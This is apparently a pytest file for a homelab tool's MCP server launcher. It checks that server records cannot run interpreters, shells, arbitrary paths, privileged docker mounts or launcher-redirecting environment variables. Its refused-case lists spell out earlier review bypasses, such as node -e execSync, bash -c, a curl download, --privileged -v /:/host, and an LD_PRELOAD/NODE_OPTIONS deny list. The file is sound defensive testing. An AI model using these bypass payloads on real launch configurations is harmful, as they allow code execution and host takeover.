# SPDX-License-Identifier: Apache-2.0
"""The launch is generated from the origin, never written in a record (ADR-0024).

A record names its origin, the server's entrypoint (``transport.bin``) and the server's own
arguments; :func:`homelabnext.mcp.servers.launch` writes the launcher with fixed flags.  The
REFUSED cases are the round-3 bypasses of the old parse-the-command-line check, restated as what
a record could still try to say: a bin that is an interpreter or shell (``npx -p PIN node -e``,
``uvx --from PIN python -c``), a path (``/tmp/evil/npx``, ``/usr/bin/python3`` as "first-party"),
a launcher flag (``--python /tmp/evil``).  Every value is fictional."""

from __future__ import annotations

import copy
from pathlib import Path

import pytest
import yaml

from homelabnext.mcp import importer, launch, servers

ROOT = Path(__file__).resolve().parents[2]
CATALOG = ROOT / "examples" / "mcp"
GH, NOTES, DOCKER, BROKER = (
    yaml.safe_load((CATALOG / f"{sid}.yml").read_text())
    for sid in ("github", "notes", "docker", "hnx-broker")
)
D = DOCKER["origin"]["digest"]
IMG = f"registry.example/mcp/docker@{D}"
COMMIT = "a" * 40
GIT_PYPI = {"kind": "git", "ecosystem": "pypi", "repo": "https://code.example/org/srv",
            "commit": COMMIT, "bins": ["srv"]}  # fmt: skip
GIT_NPM = {**GIT_PYPI, "ecosystem": "npm"}
FIRST = {"kind": "first-party", "path": "homelabnext/mcp/"}
PREFIX = "/var/lib/hnx/npm-prefix"
CTX = servers.LaunchContext(npm_prefix=PREFIX)


def _rec(base: dict, origin: dict | None = None, **transport) -> dict:
    rec = copy.deepcopy(base)
    rec["transport"] = {"type": "stdio", **transport}
    if origin is not None:
        rec["origin"] = origin
    return rec


def _problems(rec: dict) -> list[str]:
    return servers._schema_problems(rec, "x") or servers.launch_problems(rec, "x")


GH_PIN = "@example/mcp-github@3.2.0"
NOTES_PIN = "example-notes-mcp==1.2.0"
#: (record, the generated command line)
GENERATED = [
    (_rec(GH), ["npx", "-y", f"--prefix={PREFIX}", f"--package={GH_PIN}", "--", "mcp-github"]),
    (_rec(GH, bin="mcp-github", args=["--read-only"]),
     ["npx", "-y", f"--prefix={PREFIX}", f"--package={GH_PIN}", "--", "mcp-github", "--read-only"]),
    (_rec(NOTES, bin="notes-mcp"), ["uvx", "--no-config", "--from", NOTES_PIN, "notes-mcp"]),
    (_rec(NOTES), ["uvx", "--no-config", "--from", NOTES_PIN, "notes-mcp"]),  # its one bin
    (_rec(NOTES, {**NOTES["origin"], "version": "v1.2.0"}, bin="notes-mcp"),
     ["uvx", "--no-config", "--from", NOTES_PIN, "notes-mcp"]),  # a leading v is no difference
    (_rec(DOCKER, args=["--read-only"]), ["docker", "run", "-i", "--rm", IMG, "--read-only"]),
    (_rec({**DOCKER, "env": {"DOCKER_TOKEN": "secret:mcp/docker-token"},
           "settings": {"LOG_LEVEL": "debug"}}),
     ["docker", "run", "-i", "--rm", "-e", "DOCKER_TOKEN", "-e", "LOG_LEVEL", IMG]),
    (_rec(NOTES, GIT_PYPI, bin="srv"),
     ["uvx", "--no-config", "--from", f"git+{GIT_PYPI['repo']}@{COMMIT}", "srv"]),
    (_rec(GH, GIT_NPM, bin="srv"),
     ["npx", "-y", f"--prefix={PREFIX}", f"--package=git+{GIT_NPM['repo']}#{COMMIT}", "--", "srv"]),
    (_rec(BROKER, FIRST, bin="hnx", args=["mcp", "serve"]), ["hnx", "mcp", "serve"]),
    (_rec(BROKER, FIRST, bin="homelabnext/mcp/run.py"), ["homelabnext/mcp/run.py"]),
]  # fmt: skip


@pytest.mark.parametrize(("rec", "argv"), GENERATED, ids=[" ".join(g[1])[:60] for g in GENERATED])
def test_the_launch_is_generated_from_the_origin(rec, argv):
    assert _problems(rec) == []
    command, launcher_args = servers.launch(rec, CTX)
    assert [command, *launcher_args, *rec["transport"].get("args", ())] == argv


#: (record, phrase): each one the round-3 review ran as a working bypass, restated
REFUSED = [
    # 1: the command after --package/--from/--spec is checked (npx -p PIN node -e, uvx --from
    # PIN python -c, pipx --spec PIN python -c, uv tool run --from PIN bash -c)
    (_rec(GH, bin="node", args=["-e", "require('child_process').execSync('id')"]), "interpreter, shell"),
    (_rec(GH, bin="sh", args=["-c", "x"]), "interpreter, shell"),
    (_rec(NOTES, bin="python", args=["-c", "import os"]), "interpreter, shell"),
    (_rec(NOTES, bin="python3.12", args=["-c", "import os"]), "interpreter, shell"),
    (_rec(NOTES, bin="bash", args=["-c", "x"]), "interpreter, shell"),
    (_rec(NOTES, bin="env", args=["x"]), "interpreter, shell"),
    (_rec(NOTES, bin="curl", args=["-o", "/tmp/x", "https://dl.example/x"]), "interpreter, shell"),
    (_rec(GH, bin="evil-tool"), "not one of the package's reviewed bins"),
    # round 4, F2: npx and uvx run any command on PATH as the bin (`npx --package=PIN -- id -un`
    # printed root), so the bin is one of the reviewed bins, never one the package might lack
    (_rec(GH, bin="id", args=["-un"]), "not one of the package's reviewed bins"),
    (_rec(GH, {k: v for k, v in GH["origin"].items() if k != "bins"}), "names no bins"),
    (_rec(GH, {**GH["origin"], "bins": ["mcp-github-a", "mcp-github-b"]}), "declares several bins"),
    (_rec(GH, {**GH["origin"], "bins": ["mcp-github", "node"]}), "interpreter, shell"),
    (_rec(NOTES, {**GIT_PYPI, "bins": ["srv-a", "srv-b"]}), "declares several bins"),
    (_rec(NOTES, GIT_PYPI, bin="perl"), "interpreter, shell"),
    # 3 and 5: no launcher, no launcher flag, no path: a record cannot say --python /tmp/evil,
    # --directory, --index-url, --privileged, -v /:/host or /tmp/evil/npx
    ({**_rec(NOTES), "transport": {"type": "stdio", "command": "uvx", "args": ["--python", "/tmp/evil/python"]}},
     "Additional properties are not allowed ('command' was unexpected)"),
    (_rec(GH, bin="tmp/evil/npx"), "not a bare command name"),
    (_rec(GH, bin="/tmp/evil/npx"), "does not match"),
    (_rec(DOCKER, bin="sh"), "runs its own reviewed entrypoint"),
    # 4: first-party is hnx or a path under origin.path, never any path
    (_rec(BROKER, FIRST, bin="/usr/bin/python3", args=["-c", "x"]), "does not match"),
    (_rec(BROKER, FIRST, bin="python3", args=["-c", "x"]), "neither hnx nor a path under"),
    (_rec(BROKER, FIRST, bin="node_modules/.bin/x"), "does not match"),
    (_rec(BROKER, FIRST, bin="homelabnext/agent/x.py"), "neither hnx nor a path under"),
    (_rec(BROKER, FIRST, bin="homelabnext/mcp/../../x"), "does not match"),
    (_rec(BROKER, FIRST), "names its bin"),
    # origins with no generated launch, or not pinned the way a launcher reads them
    (_rec(GH, {"kind": "package", "ecosystem": "cargo", "package": "x", "version": "1.0.0",
               "sha256": "b" * 64}), "run it from an image"),
    (_rec(GH, {**GH["origin"], "version": "3.2"}), "not a full x.y.z"),
    (_rec(GH, {**GH["origin"], "package": "@Example/Bad Name"}), "does not match"),
    (_rec(NOTES, {k: v for k, v in GIT_PYPI.items() if k != "ecosystem"}, bin="srv"), "names its ecosystem"),
    (_rec(NOTES, {**GIT_PYPI, "repo": "https://fakeuser:fakepw@code.example/org/srv"}, bin="srv"),
     "not an https URL without credentials"),
    (_rec(NOTES, {**GIT_PYPI, "repo": "http://code.example/org/srv"}, bin="srv"), "not an https URL"),
    (_rec(NOTES, {k: v for k, v in GIT_PYPI.items() if k != "bins"}, bin="srv"), "names no bins"),
]  # fmt: skip


@pytest.mark.parametrize(
    ("rec", "phrase"), REFUSED, ids=[f"{r[1][:24]} {r[0]['transport']}"[:70] for r in REFUSED]
)
def test_a_record_cannot_launch_anything_but_its_pin(rec, phrase):
    problems = _problems(rec)
    assert any(phrase in p for p in problems), problems


def test_a_launcher_flag_in_args_reaches_the_server_never_the_launcher():
    """``args`` follow the bin (npx: after ``--``; uvx: after the command, which takes the rest),
    so ``--python /tmp/evil`` or ``--registry`` is the server's own argument."""
    rec = _rec(NOTES, bin="notes-mcp", args=["--python", "/tmp/evil/python"])
    command, prefix = servers.launch(rec, CTX)
    assert (command, prefix) == ("uvx", ["--no-config", "--from", NOTES_PIN, "notes-mcp"])
    rec = _rec(GH, args=["--registry", "https://npm.example"])
    assert servers.launch(rec, CTX) == (
        "npx", ["-y", f"--prefix={PREFIX}", f"--package={GH_PIN}", "--", "mcp-github"])  # fmt: skip


def test_the_default_bin_is_the_single_declared_one_or_the_base_name_when_listed():
    """No bin: the one declared bin, else the package's base name when bins lists it; with
    several and no base name among them, the record names the bin."""
    many = {**GH["origin"], "bins": ["mcp-github", "mcp-github-admin"]}
    assert servers.launch(_rec(GH, many), CTX)[1][-1] == "mcp-github"
    assert servers.resolve_bin({**many, "bins": ["a-cli", "b-cli"]}, None)[0] is None
    assert servers.resolve_bin({**GIT_PYPI, "repo": GIT_PYPI["repo"] + ".git",
                                "bins": ["srv", "x"]}, None) == ("srv", None)  # fmt: skip


def test_an_npm_launch_is_anchored_at_an_absolute_prefix_never_the_clients_cwd():
    """npx resolves ``node_modules/<package>`` and reads ``.npmrc`` in the client's working
    directory before the pinned package (round 4, F1): a shadow copy ran with the exact generated
    argv.  ``--prefix=<an absolute empty dir>`` moves both lookups there (verified with npx 10:
    the shadow and a project ``.npmrc`` registry are ignored).  Without a prefix, or with a
    relative one, there is no launch."""
    for ctx in (None, servers.LaunchContext(), servers.LaunchContext(npm_prefix="npm-prefix"),
                servers.LaunchContext(npm_prefix="/srv/../tmp"),
                servers.LaunchContext(npm_prefix="/srv/$HOME")):  # fmt: skip
        with pytest.raises(ValueError, match="npm_prefix"):
            servers.launch(_rec(GH), ctx)
    _, argv = servers.launch(_rec(GH, bin="mcp-github"), CTX)
    assert argv.index(f"--prefix={PREFIX}") < argv.index("--")


def test_a_uvx_launch_reads_no_uv_config():
    """``uvx --no-config``: a ``uv.toml`` (user-level, which the agent's own user can write) or
    ``[tool.uv]`` cannot redirect the index for the pin (verified with uv 0.11)."""
    for origin in (NOTES["origin"], GIT_PYPI):
        command, argv = servers.launch(_rec(NOTES, origin), CTX)
        assert (command, argv[:2]) == ("uvx", ["--no-config", "--from"])


#: (command, args, what the importer keeps): a foreign command line it maps, or refuses to
IMPORTED = [
    ("npx", ["-y", GH_PIN, "--read-only"], {"bin": None, "args": ["--read-only"]}),
    ("npx", ["-y", f"--package={GH_PIN}", "--", "mcp-github"], {"bin": None, "args": []}),  # default
    ("uvx", ["--python", "/tmp/evil/python", "--from", NOTES_PIN, "notes-mcp"],
     {"bin": "notes-mcp", "args": [], "dropped": ["--python"]}),
    ("uvx", ["--directory", "/tmp/evil", NOTES_PIN], {"bin": None, "dropped": ["--directory"]}),
    ("uvx", ["--with", "evil", "--index-url", "https://pypi.example/simple", NOTES_PIN],
     {"bin": None, "dropped": ["--index-url", "--with"]}),
    ("docker", ["run", "-i", "--rm", "--privileged", "-v", "/:/host", "--pid", "host", IMG],
     {"bin": None, "args": [], "dropped": ["--pid", "-v"]}),
    ("/tmp/evil/npx", ["-y", GH_PIN], {"bin": None}),  # the rendered launch is a bare npx
    # not mapped at all: the draft keeps no origin, bin or argument
    ("npx", ["-y", "-p", GH_PIN, "node", "-e", "x"], None),
    ("uvx", ["--from", NOTES_PIN, "python", "-c", "x"], None),
    ("pipx", ["run", "--spec", NOTES_PIN, "python", "-c", "x"], None),
    ("uv", ["tool", "run", "--from", NOTES_PIN, "bash", "-c", "x"], None),
    ("docker", ["run", "-i", "--entrypoint", "sh", IMG, "-c", "x"], None),
    ("npx", ["--fancy", GH_PIN], None),
    ("/usr/bin/python3", ["-c", "x"], None),
    ("sh", ["-c", f"npx -y {GH_PIN}"], None),
    ("/usr/bin/env", ["npx", "-y", GH_PIN], None),
]  # fmt: skip


@pytest.mark.parametrize(
    ("command", "args", "kept"), IMPORTED, ids=[f"{c} {' '.join(a)[:40]}" for c, a, _ in IMPORTED]
)
def test_the_importer_maps_a_launch_or_refuses_it(command, args, kept):
    rec, notes = importer.draft("probe", {"command": command, "args": args}, "t.json")
    t = rec["transport"]
    assert "command" not in t
    if kept is None:
        assert rec["origin"]["kind"] == "unknown" and t == {"type": "stdio"}, rec
        assert any("not mapped" in n for n in notes), notes
        return
    assert t.get("bin") == kept["bin"] and t.get("args", []) == kept.get("args", t.get("args", []))
    if kept.get("dropped"):
        assert any(str(kept["dropped"]) in n for n in notes), notes
    assert servers.launch_problems(rec, "x") == []


def test_the_importer_reads_the_origin_from_the_launch_position():
    assert importer.guess_origin("npx", ["-y", "evil@1.0.0", GH_PIN])["package"] == "evil"
    assert importer.guess_origin("docker", ["run", "-i", "--name", "n", IMG])["digest"] == D
    assert (
        importer.guess_origin("pipx", ["run", "--spec", "pkg==1.0.0", "app"])["version"] == "1.0.0"
    )
    git = importer.guess_origin(
        "uvx", ["--from", f"git+https://code.example/org/srv@{COMMIT}", "srv"]
    )
    assert git == {k: v for k, v in GIT_PYPI.items() if k != "bins"}  # bins: the review's
    got = launch.parse("docker", ["run", "-i", "-e", "K=v", "--name", "x", IMG, "--srv-flag"])
    assert (got.spec, got.spec_index, got.server_args) == (IMG, 6, 7)
    assert launch.parse("/opt/x/sh", []).ecosystem is None


def test_every_example_record_renders_its_generated_launch():
    cat = servers.load(CATALOG)
    for sid, rec in cat:
        if rec["transport"]["type"] == "stdio":
            assert servers.launch_problems(rec, sid) == []
            command, _ = servers.launch(rec, CTX)
            assert command in ("npx", "uvx", "docker", "hnx"), sid


#: keys the round-3 review set through settings to redirect or replace what the launch runs
LAUNCHER_KEYS = ["NPM_CONFIG_REGISTRY", "NPM_CONFIG_USERCONFIG", "UV_INDEX_URL", "UV_EXTRA_INDEX_URL",
                 "UV_PYTHON", "UV_CONFIG_FILE", "PIP_INDEX_URL", "PIPX_DEFAULT_PYTHON", "NODE_OPTIONS",
                 "LD_PRELOAD", "PATH", "DOCKER_HOST", "BUN_CONFIG_REGISTRY", "PYTHONSTARTUP",
                 "CONTAINERS_CONF", "GIT_SSH_COMMAND", "XDG_CONFIG_HOME", "HOME"]  # fmt: skip


@pytest.mark.parametrize("key", LAUNCHER_KEYS)
def test_no_setting_env_or_parameter_configures_the_launcher(key):
    """A record's settings and env are the launcher's environment too (npx, uvx, docker read
    them), so NPM_CONFIG_REGISTRY or UV_INDEX_URL would fetch another package for the pin."""
    base = DOCKER if key.startswith(("DOCKER", "CONTAINER")) else NOTES
    for edit in (
        lambda r: r.setdefault("settings", {}).update({key: "/tmp/evil"}),
        lambda r: r.setdefault("env", {}).update({key: "secret:mcp/evil"}),
        lambda r: r.setdefault("parameters", {}).update(
            {"evil": {"env": key, "enum": ["x"], "default": "x"}}
        ),
    ):
        rec = copy.deepcopy(base)
        edit(rec)
        problems = servers._template_problems(rec, "x")
        assert any(key in p and ("launcher" in p or "never be set" in p) for p in problems), (
            problems
        )
    assert servers.denied_env(key.lower())  # any case: npm reads npm_config_registry too


def test_ordinary_settings_are_not_launcher_configuration():
    for key in (
        "NOTES_ROOT",
        "LOG_LEVEL",
        "NODEJS_MCP_MODE",
        "DOCKERFILE_DIR",
        "PATHS",
        "HOMEPAGE",
    ):
        assert not servers.denied_env(key), key
